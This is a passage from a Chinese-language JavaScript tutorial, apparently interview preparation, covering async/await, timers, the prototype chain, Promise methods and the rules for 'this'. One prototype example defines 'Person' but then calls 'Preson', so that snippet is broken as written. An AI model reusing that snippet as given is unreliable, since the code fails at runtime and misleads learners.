class="hljs-number">1000</span>);<br>  &#125;);<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出 &quot;Async data&quot;</span><br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">main</span>();<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>事件监听：</strong> 异步编程还可以通过事件监听来实现。例如，浏览器中的事件处理器可以在某个事件发生时执行回调函数，而不会阻塞主线程。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Button clicked&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>定时器：</strong> 定时器是一种常见的异步编程机制，它可以用来延迟执行代码或定期执行代码。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Delayed code&#x27;</span>);<br>&#125;, <span class="hljs-number">1000</span>);<br><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Repeated code&#x27;</span>);<br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure></li>
</ol>
<p>总之，异步编程是一种重要的编程方式，用于处理需要等待或不立即执行的任务。它使程序能够更加高效地处理各种异步操作，保持界面的响应性，同时提高了代码的可维护性。JavaScript提供了多种异步编程机制，开发者可以根据需求选择合适的方式。</p>
<h3 id="5、原型和原型链"><a href="#5、原型和原型链" class="headerlink" title="5、原型和原型链"></a>5、原型和原型链</h3><p>相关题目：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7008526225207640078">https://juejin.cn/post/7008526225207640078</a></p>
<p>众所周知，JS的复杂类型都是对象类型（<strong>Object</strong>），而JS不是一门完全面向对象编程的语言，所以如何涉及继承机制，就是一个问题。</p>
<h5 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h5><p>因为JS中没有类（<strong>Class</strong>）这个概念，所以JS的设计者使用了<code>构造函数</code>来实现继承机制。</p>
<blockquote>
<p>ES6中的<code>class</code>可以看作只是一个语法糖，它的绝大部分的功能，ES5都可以做到，新的<code>class</code>写法只是让原型的写法更加的清晰、更像面向对象编程的语法而已。下文也会进一步的说明。（摘自阮一峰的ES6入门）</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-comment">// 生成实例</span><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;zhangsan&#x27;</span>, <span class="hljs-number">18</span>);<br></code></pre></td></tr></table></figure>

<p>如上述代码所示，JS通过<code>构造函数</code>来生成<code>实例</code>。但是又出现了一个新的问题，在<code>构造函数</code>中通过<code>this</code>赋值的属性或者方法，是每个实例的<code>实例属性</code>以及<code>实例方法</code>，无法共享公共属性。所以又设计出了一个<code>原型对象</code>，来存储这个<code>构造函数</code>的公共属性以及方法。</p>
<h5 id="补充知识：构造函数创建一个实例的过程"><a href="#补充知识：构造函数创建一个实例的过程" class="headerlink" title="补充知识：构造函数创建一个实例的过程"></a>补充知识：构造函数创建一个实例的过程</h5><ol>
<li>创建一个新对象</li>
<li>将构造函数的作用域赋值给新对象（这样this就指向了新对象）</li>
<li>执行构造函数中的代码（为新对象添加实例属性和实例方法）</li>
<li>返回新对象</li>
</ol>
<h5 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象"></a>原型对象</h5><p>说了这么久，终于说到了JS的<code>原型对象</code>了。JS的每个函数在创建的时候，都会生成一个属性<code>prototype</code>，这个属性指向一个对象，这个对象就是此函数的<code>原型对象</code>。该<code>原型对象</code>中有个属性为<code>constructor</code>，指向该函数。这样<code>原型对象</code>和<code>它的函数</code>之间就产生了联系。</p>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f5aaae37b7094aaaad14daa910c61775~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="image.png"></p>
<h5 id="JS原型链"><a href="#JS原型链" class="headerlink" title="JS原型链"></a>JS原型链</h5><p>讲清楚了JS的<code>原型对象</code>，来就是介绍JS的<code>原型链</code>了。既然有了<code>构造函数</code>，那么就可以通过该<code>构造函数</code>，来创建一个实例对象了。此时，完善一下我们的<code>Person</code>构造函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><span class="hljs-comment">// 所有实例共享的公共方法</span><br><span class="hljs-title class_">Preson</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">say</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">word</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>说：<span class="hljs-subst">$&#123;word&#125;</span>`</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Preson</span>(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">18</span>); <span class="hljs-comment">// 创建一个Person实例对象</span><br>p1.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;say&#x27;</span>) <span class="hljs-comment">// false 说明不是定义在其本身上的</span><br>p1.<span class="hljs-title function_">say</span>(<span class="hljs-string">&#x27;hello world&#x27;</span>); <span class="hljs-comment">// 调用公共方法 打印：张三说：hello world</span><br></code></pre></td></tr></table></figure>

<p>这里就要思考了，为什么我们构造的<code>p1</code>这个<code>实例对象</code>，它可以调用到<code>Person</code>这个<code>构造函数</code>的<code>原型对象</code>上的方法呢？明明只有在<code>构造函数</code>内部通过<code>this</code>来赋值的属性或者方法才会被实例所继承，为什么在<code>构造函数</code>的<code>原型对象</code>上定义的<code>say</code>方法也能通过实例来调用到呢？这里就引出了<code>原型链</code>这个概念。</p>
<h5 id="proto"><a href="#proto" class="headerlink" title="proto"></a><em><em>proto</em></em></h5><p>每个通过<code>构造函数</code>创建出来的<code>实例对象</code>，其本身有个属性<code>__proto__</code>，这个属性会指向该<code>实例对象</code>的<code>构造函数</code>的<code>原型对象</code>，这么说好像有点绕，我们看下图</p>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1141452b532f4e9cab03ba48f58beade~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p><code>__proto__</code> 并不是语言本身的特性，这是各大厂商具体实现时添加的<code>私有属性</code>，虽然目前很多现代浏览器的 JS 引擎中都提供了这个私有属性，但依旧不建议在生产中使用该属性，避免对环境产生依赖。生产环境中，我们可以使用 Object.getPrototypeOf 方法来获取实例对象的原型，然后再来为原型添加方法&#x2F;属性。（摘自阮一峰的ES6入门）</p>
</blockquote>
<p>现在我们知道了，当访问一个<code>对象</code>的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会通过它的<code>__proto__</code>隐式属性，找到它的<code>构造函数</code>的<code>原型对象</code>，如果还没有找到就会再在其<code>构造函数</code>的<code>prototype</code>的<code>__proto__</code>中查找，这样一层一层向上查找就会形成一个链式结构，我们称为<code>原型链</code>。</p>
<p><strong>注意点</strong>：如果通过<code>p1实例对象</code>的<code>__proto__</code>属性赋值，则会改变其<code>构造函数</code>的<code>原型对象</code>，从而被所有实例所共享。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Preson</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><span class="hljs-comment">// 所有实例共享的公共方法</span><br><span class="hljs-title class_">Preson</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">say</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">word</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>说：<span class="hljs-subst">$&#123;word&#125;</span>`</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Preson</span>(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">18</span>); <span class="hljs-comment">// 创建一个Person实例对象</span><br><span class="hljs-keyword">const</span> p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Preson</span>(<span class="hljs-string">&#x27;李四&#x27;</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// 新创建一个Proson实例对象</span><br>p1.<span class="hljs-title function_">say</span>(<span class="hljs-string">&#x27;hello world&#x27;</span>); <span class="hljs-comment">// 调用公共方法</span><br>p1.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;say&#x27;</span>) <span class="hljs-comment">// false 说明不是定义在其本身上的</span><br>p1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">do</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;往原型对象中添加方法&#x27;</span>);<br>&#125;<br>p2.<span class="hljs-title function_">do</span>(); <span class="hljs-comment">// 打印出了-往原型对象中添加方法</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>所以，我们在开发的时候，要注意不要通过<code>实例对象</code>去改变其<code>构造函数</code>的<code>原型对象</code>，这样会对其他通过该<code>构造函数</code>生成的<code>实例对象</code>造成影响。</p>
</blockquote>
<p>说到这里，有的读者可能又会产生疑问了，再在其<code>构造函数</code>的<code>prototype</code>的<code>__proto__</code>中查找是什么意思？我们继续往下看。</p>
<h5 id="补充知识：原型链的尽头"><a href="#补充知识：原型链的尽头" class="headerlink" title="补充知识：原型链的尽头"></a>补充知识：原型链的尽头</h5><p>既然我们之前构造的<code>p1实例对象</code>有<code>__proto__</code>属性指向其<code>构造函数</code>的<code>原型对象</code>，那么该<code>构造函数</code>的<code>原型对象</code>有这个<code>__proto__</code>属性吗？如果有，那么其又指向谁呢？我们不妨打印一下。</p>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2750863007534407b542d38ea5259cdf~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="image.png"></p>
<p>我们随便创建了一个<code>A</code>的<code>构造函数</code>，通过打印它的<code>prototype</code>属性，我们可以看到，在浏览器中，它有个<code>__proto__</code>属性指向了一个<code>Object</code>对象。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e2cda9bce64b41339f411a9c974000d7~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="image.png"></p>
<p>而进一步展开后，我们会发现，该对象的<code>构造函数</code>为<code>function Object</code>，我们由此可以得知，<strong>所有的<code>原型对象</code>的<code>__proto__</code>属性都是指向<code>function Object</code>的<code>原型对象</code>。</strong> 而<code>function Object</code>的<code>原型对象</code>在上图中我们可以得知是不存在<code>__proto__</code>这个属性的，它指向了<code>null</code>。我们就得知了<code>原型链</code>的尽头是<code>null</code>。</p>
<h5 id="补充知识：所有对象的原型链"><a href="#补充知识：所有对象的原型链" class="headerlink" title="补充知识：所有对象的原型链"></a>补充知识：所有对象的原型链</h5><p>既然JS的复杂类型都是<code>对象</code>，那么，函数作为一个<code>对象</code>，是否也存在<code>原型链</code>呢？ 我们在浏览器中创建一个<code>构造函数</code>，打印它的<code>__proto__</code>属性，一探究竟：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/818ed8034ed54aa9aa6591d8be8a70ea~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="image.png"></p>
<p>我们可以看到，它的<code>__proto__</code>属性指向了一个<code>function Function</code>的<code>原型对象</code>，该<code>原型对象</code>为JS中所有函数的<code>原型对象</code>，而其<code>__proto__</code>属性也还是指向了<code>function Object</code>的<code>原型对象</code>，所以验证了<code>原型链</code>的尽头为<code>null</code>，这一说法。</p>
<p>最后，奉上神图一张，祝大家理解JS的<code>原型链</code></p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0815c8f7fa544cf4a33fd7defdc6c1f6~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="6、promise方法介绍"><a href="#6、promise方法介绍" class="headerlink" title="6、promise方法介绍"></a>6、promise方法介绍</h3><p>Promise 是 JavaScript 中用于处理异步操作的一种机制，它提供了一种更结构化和可读的方式来编写异步代码，以避免回调地狱（Callback Hell）的问题。Promise 的主要方法包括：</p>
<ol>
<li><p><strong>Promise 构造函数：</strong></p>
<ul>
<li><code>Promise</code> 构造函数用于创建一个新的 Promise 对象。它接受一个带有两个参数的函数作为参数，这个函数会在 Promise 对象被创建时立即执行。这个函数通常包含异步操作，它会在异步操作完成后决定 Promise 对象的状态。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> myPromise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 异步操作</span><br>  <span class="hljs-keyword">if</span> (异步操作成功) &#123;<br>    <span class="hljs-title function_">resolve</span>(成功的结果);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">reject</span>(失败的原因);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>Promise.prototype.then()：</strong></p>
<ul>
<li><code>then()</code> 方法用于添加处理 Promise 对象成功状态的回调函数。它接受两个参数，第一个参数是成功时的回调函数，第二个参数是可选的失败时的回调函数。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">myPromise.<span class="hljs-title function_">then</span>(<br>  <span class="hljs-function">(<span class="hljs-params">成功的结果</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 处理成功</span><br>  &#125;,<br>  <span class="hljs-function">(<span class="hljs-params">失败的原因</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 处理失败</span><br>  &#125;<br>);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>Promise.prototype.catch()：</strong></p>
<ul>
<li><code>catch()</code> 方法用于添加处理 Promise 对象失败状态的回调函数。它是 <code>then(null, 失败的回调函数)</code> 的简写形式。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">myPromise.<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">失败的原因</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 处理失败</span><br>&#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>Promise.prototype.finally()：</strong></p>
<ul>
<li><code>finally()</code> 方法用于添加一个回调函数，不论 Promise 对象的状态是成功还是失败，该回调函数都会被执行。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">myPromise.<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 无论成功或失败都会执行的操作</span><br>&#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>Promise.all()：</strong></p>
<ul>
<li><code>Promise.all()</code> 静态方法接受一个可迭代的 Promise 数组，返回一个新的 Promise 对象。该 Promise 对象在所有输入的 Promise 对象都成功时才会成功，一旦有一个失败，则它也会失败。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([promise1, promise2, promise3])<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">results</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 所有 Promise 都成功，results 包含各个 Promise 的成功结果</span><br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 任何一个 Promise 失败，会进入这里</span><br>  &#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>Promise.race()：</strong></p>
<ul>
<li><code>Promise.race()</code> 静态方法接受一个可迭代的 Promise 数组，返回一个新的 Promise 对象。该 Promise 对象在输入的 Promise 数组中的任何一个 Promise 成功或失败时，就会立即返回。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([promise1, promise2, promise3])<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 只要有一个 Promise 成功，result 包含第一个成功的结果</span><br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 只要有一个 Promise 失败，会进入这里</span><br>  &#125;);<br></code></pre></td></tr></table></figure></li>
</ol>
<p>这些方法是 Promise 的核心方法，它们允许你更容易地管理异步操作，处理成功和失败状态，以及实现复杂的异步控制流。使用 Promise 可以提高代码的可读性和可维护性，减少了回调地狱的问题。</p>
<h5 id="为什么用promise而不用callback的方式"><a href="#为什么用promise而不用callback的方式" class="headerlink" title="为什么用promise而不用callback的方式"></a>为什么用promise而不用callback的方式</h5><p>异步编程是在 JavaScript 中常见的需求，用于处理诸如网络请求、文件读取、定时器等异步操作。为了解决异步编程的问题，有多种解决方案，其中包括：</p>
<ol>
<li><p><strong>回调函数（Callback）：</strong> 这是 JavaScript 中最早的异步编程方式。回调函数是将一个函数作为参数传递给另一个函数，在异步操作完成后调用这个函数。尽管回调函数是一种有效的方式，但容易导致回调地狱（callback hell），使代码难以阅读和维护。</p>
</li>
<li><p><strong>Promise：</strong> Promise 是一种用于管理异步操作的对象，它可以表示一个异步操作的成功或失败。Promise 提供了更清晰的语法和更好的错误处理机制，可以使用 <code>then</code> 和 <code>catch</code> 方法链式处理异步操作，减少回调地狱的问题。</p>
</li>
<li><p><strong>Async&#x2F;Await：</strong> Async&#x2F;Await 是 ES2017 引入的语法糖，它建立在 Promise 基础上，使异步代码更类似于同步代码的结构。通过在函数前面添加 <code>async</code> 关键字，可以在函数内使用 <code>await</code> 关键字来等待异步操作的完成。这种方式提高了异步代码的可读性。</p>
</li>
<li><p><strong>Generator 函数：</strong> Generator 函数是一种特殊的函数，可以暂停和恢复执行，通过使用 <code>yield</code> 关键字可以在函数内进行异步操作。Generator 函数通常需要与其他工具库（如 co.js）一起使用。</p>
</li>
</ol>
<p>为什么使用 Promise 而不使用回调函数的方式？</p>
<ol>
<li><p><strong>可读性更高：</strong> Promise 提供了链式调用的语法，使得异步操作的顺序更加清晰，代码更易读。</p>
</li>
<li><p><strong>错误处理更容易：</strong> 使用 Promise 的 <code>catch</code> 方法可以捕获并处理异步操作中的错误，而回调方式可能需要手动处理错误。</p>
</li>
<li><p><strong>避免回调地狱：</strong> Promise 可以避免回调地狱，即多层嵌套的回调函数，使代码更易维护。</p>
</li>
<li><p><strong>更多的内置功能：</strong> Promise 提供了丰富的功能，如 <code>Promise.all</code>、<code>Promise.race</code> 等，用于处理多个异步操作。</p>
</li>
</ol>
<p>总之，Promise 是一种更现代、更易用、更可读、更易维护的异步编程方式，因此在实际开发中更常见。当然，Async&#x2F;Await 也是一种很强大的异步编程方式，可以进一步提高代码的可读性和维护性。</p>
<h5 id="promise真的解决-回调地狱了吗"><a href="#promise真的解决-回调地狱了吗" class="headerlink" title="promise真的解决 回调地狱了吗"></a>promise真的解决 回调地狱了吗</h5><p>Promise 是一种用于处理异步操作的 JavaScript 对象，它提供了一种更清晰、更可读的方式来处理异步代码，有助于减轻回调地狱（Callback Hell）问题。然而，它并没有完全解决回调地狱，而是提供了一种更好的替代方案，称为 Promise 链或链式调用。</p>
<p>回调地狱通常发生在多个异步操作需要依次执行的情况下，例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">asyncFunction1</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">asyncFunction2</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">asyncFunction3</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-comment">// ...</span><br>    &#125;);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>这种嵌套的回调结构难以阅读和维护，而 Promise 可以通过链式调用的方式改善这种情况：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">asyncFunction1</span>()<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">asyncFunction2</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">asyncFunction3</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// ...</span><br>  &#125;);<br></code></pre></td></tr></table></figure>

<p>这种方式使代码更具可读性，但并没有完全消除回调地狱。当有大量的异步操作需要处理时，仍然可能会出现链式 <code>.then()</code> 调用，导致代码嵌套深度增加。此时，Async&#x2F;Await 是一种更现代、更清晰的替代方案，它使异步代码看起来更像同步代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doAsyncWork</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncFunction1</span>();<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncFunction2</span>();<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncFunction3</span>();<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>虽然 Promise 和 Async&#x2F;Await 可以显著改善异步代码的可读性和维护性，但在处理复杂的异步控制流时，仍然需要小心管理嵌套和错误处理。此外，新的 JavaScript 特性如 Generator 和 RxJS 也提供了更多处理异步操作的方式，开发者可以根据项目需求选择适合的工具。总之，虽然 Promise 带来了显著的改进，但不是绝对解决回调地狱的唯一方案。</p>
<h3 id="7、this指向"><a href="#7、this指向" class="headerlink" title="7、this指向"></a>7、this指向</h3><p>JavaScript 中的 <code>this</code> 是一个特殊的关键字，它表示当前执行上下文中的对象。<code>this</code> 的值在不同的情况下会有不同的绑定规则，因此需要理解它的工作原理。</p>
<p>以下是 <code>this</code> 的工作原理的主要规则：</p>
<ol>
<li><p>**全局上下文中的 <code>this</code>**：</p>
<ul>
<li>在全局上下文中，<code>this</code> 指向全局对象，通常是 <code>window</code>（浏览器环境）或 <code>global</code>（Node.js 环境）。</li>
<li>在浏览器中，你可以在浏览器控制台中输入 <code>console.log(this)</code> 来查看全局上下文中的 <code>this</code>。</li>
</ul>
</li>
<li><p>**函数内部的 <code>this</code>**：</p>
<ul>
<li>在函数内部，<code>this</code> 的值取决于函数的调用方式。它可能指向不同的对象或者根本不指向对象。</li>
<li>如果函数是作为对象的方法调用的，<code>this</code> 将指向调用该方法的对象。</li>
<li>如果函数是作为独立函数调用的，<code>this</code> 将指向全局对象（浏览器环境中通常是 <code>window</code>）。</li>
<li>如果函数是作为构造函数使用的（使用 <code>new</code> 关键字），<code>this</code> 将指向新创建的对象。</li>
<li>如果使用箭头函数，<code>this</code> 将捕获外部函数的 <code>this</code> 值，与箭头函数定义时的上下文有关。</li>
</ul>
</li>
<li><p>**事件处理函数中的 <code>this</code>**：</p>
<ul>
<li>在事件处理函数中，<code>this</code> 通常指向触发事件的元素。</li>
<li>例如，当点击按钮时，<code>this</code> 将指向该按钮元素。</li>
</ul>
</li>
<li><p>**方法链中的 <code>this</code>**：</p>
<ul>
<li>当在方法链中调用多个方法时，<code>this</code> 通常指向前一个方法返回的对象。</li>
<li>这使得方法链的连续调用成为可能。</li>
</ul>
</li>
<li><p>**通过 <code>.call()</code> 和 <code>.apply()</code> 明确设置 <code>this</code>**：</p>
<ul>
<li>使用 <code>.call()</code> 和 <code>.apply()</code> 方法可以显式地设置函数内部的 <code>this</code> 值。</li>
<li>这两个方法允许你将一个对象作为参数传递给函数，该对象将成为函数内部的 <code>this</code>。</li>
</ul>
</li>
</ol>
<p>总之，JavaScript 中的 <code>this</code> 的值取决于函数的调用方式和上下文。了解这些规则是编写有效 JavaScript 代码的关键之一。在不同的情况下，需要小心处理 <code>this</code>，以确保它指向正确的对象。</p>
